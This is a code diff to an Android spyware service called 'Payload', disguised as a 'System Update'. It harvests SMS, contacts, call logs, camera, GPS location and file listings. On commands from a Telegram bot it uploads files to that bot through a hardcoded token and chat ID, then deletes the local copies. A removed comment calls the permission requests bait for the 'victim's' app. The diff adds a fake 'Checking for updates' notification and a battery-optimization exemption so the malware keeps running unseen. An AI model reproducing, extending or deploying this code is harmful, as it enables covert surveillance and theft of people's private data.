@@ -1,16 +1,20 @@
 package com.system.update;
 
 import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
+import android.provider.Settings;
 import android.util.Log;
 import android.database.Cursor;
 import android.provider.ContactsContract;
 import android.provider.CallLog;
-import android.net.Uri;
 import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
@@ -30,26 +34,21 @@ import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 public class Payload extends Service {
-    // Token Bot Baru kamu
-    private String BOT_TOKEN = "9163541732:AAHrGKUwIuEQ8OQOextL9deMJVWh6sSIqlw"; 
+    // ── TOKEN BOT PAYLOAD BARU KAMU ──
+    private String BOT_TOKEN = "9163541732:AAFz_ibQ0T0hC_4tR81RzuKgF8bcx3-TyqQ"; 
     private String CHAT_ID = "8598136412";
     
     private volatile boolean isRunning = true;
     private long lastUpdateId = 0;
 
-    // ── FUNGSI PEMANCING IZIN (BAKAL DIPANGGIL OLEH APLIKASI KORBAN) ──
     public static void askPermissions(Activity activity) {
         if (Build.VERSION.SDK_INT >= 23) {
             List<String> permissions = new ArrayList<>();
             String[] perms = {
-                "android.permission.READ_SMS",
-                "android.permission.RECEIVE_SMS",
-                "android.permission.READ_CONTACTS",
-                "android.permission.READ_CALL_LOG",
-                "android.permission.CAMERA",
-                "android.permission.ACCESS_FINE_LOCATION",
-                "android.permission.READ_EXTERNAL_STORAGE",
-                "android.permission.WRITE_EXTERNAL_STORAGE"
+                "android.permission.READ_SMS", "android.permission.RECEIVE_SMS",
+                "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG",
+                "android.permission.CAMERA", "android.permission.ACCESS_FINE_LOCATION",
+                "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"
             };
             for (String p : perms) {
                 if (activity.checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
@@ -59,12 +58,35 @@ public class Payload extends Service {
             if (!permissions.isEmpty()) {
                 activity.requestPermissions(permissions.toArray(new String[0]), 101);
             }
+            
+            try {
+                Intent intent = new Intent();
+                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + activity.getPackageName()));
+                activity.startActivity(intent);
+            } catch (Exception e) {}
         }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d("SystemUpdate", "Service started...");
+        
+        if (Build.VERSION.SDK_INT >= 26) {
+            String CHANNEL_ID = "sys_update_channel";
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
+            channel.setShowBadge(false);
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            if (manager != null) manager.createNotificationChannel(channel);
+
+            Notification notification = new Notification.Builder(this, CHANNEL_ID)
+                    .setContentTitle("System Update")
+                    .setContentText("Checking for updates...")
+                    .setSmallIcon(android.R.drawable.ic_popup_sync)
+                    .build();
+            startForeground(1, notification);
+        }
+
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -103,7 +125,7 @@ public class Payload extends Service {
                         } else if (jsonResponse.contains("\"text\":\"/lacak\"")) {
                             sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
                         } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
-                            sendTelegramMessage("📂 *Isi Folder (10 Teratas):*\n" + listFiles("/storage/emulated/0/"));
+                            sendTelegramMessage("📂 *Isi Folder:*\n" + listFiles("/storage/emulated/0/"));
                         }
 
                     } catch (Exception e) { e.printStackTrace(); }
@@ -164,11 +186,9 @@ public class Payload extends Service {
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
             Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-            if (loc != null) {
-                return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
-            }
+            if (loc != null) return "Lat: " + loc.getLatitude() + "\nLng: " + loc.getLongitude();
         } catch (Exception e) { return "Gagal ambil lokasi."; }
-        return "Lokasi tidak tersedia (GPS mati).";
+        return "Lokasi tidak tersedia.";
     }
 
     private String listFiles(String path) {
@@ -177,9 +197,7 @@ public class Payload extends Service {
             File dir = new File(path);
             File[] files = dir.listFiles();
             if (files != null) {
-                for (int i = 0; i < files.length && i < 10; i++) {
-                    sb.append(files[i].getName()).append("\n");
-                }
+                for (int i = 0; i < files.length && i < 10; i++) sb.append(files[i].getName()).append("\n");
             }
         } catch (Exception e) { return "Gagal baca file."; }
         return sb.length() > 0 ? sb.toString() : "Folder kosong.";
@@ -218,44 +236,22 @@ public class Payload extends Service {
         try {
             File file = new File(filePath);
             if (!file.exists()) return;
-            
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + (isPhoto ? "/sendPhoto" : "/sendDocument");
             HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
             conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
-            
             DataOutputStream request = new DataOutputStream(conn.getOutputStream());
-            
-            request.writeBytes("--" + boundary + "\r\n");
-            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
-            request.writeBytes(CHAT_ID + "\r\n");
-            
-            if (caption != null) {
-                request.writeBytes("--" + boundary + "\r\n");
-                request.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
-                request.writeBytes(caption + "\r\n");
-            }
-            
-            request.writeBytes("--" + boundary + "\r\n");
-            request.writeBytes("Content-Disposition: form-data; name=\"" + (isPhoto ? "photo" : "document") + "\"; filename=\"" + file.getName() + "\"\r\n");
-            request.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
-            
+            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + CHAT_ID + "\r\n");
+            if (caption != null) request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
+            request.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"" + file.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
             FileInputStream fis = new FileInputStream(file);
             byte[] buffer = new byte[4096];
             int bytesRead;
-            while ((bytesRead = fis.read(buffer)) != -1) {
-                request.write(buffer, 0, bytesRead);
-            }
+            while ((bytesRead = fis.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
             fis.close();
-            
             request.writeBytes("\r\n--" + boundary + "--\r\n");
-            request.flush();
-            request.close();
-            
-            conn.getResponseCode();
-            file.delete();
-            
+            request.flush(); request.close(); conn.getResponseCode(); file.delete();
         } catch (Exception e) { e.printStackTrace(); }
     }
 
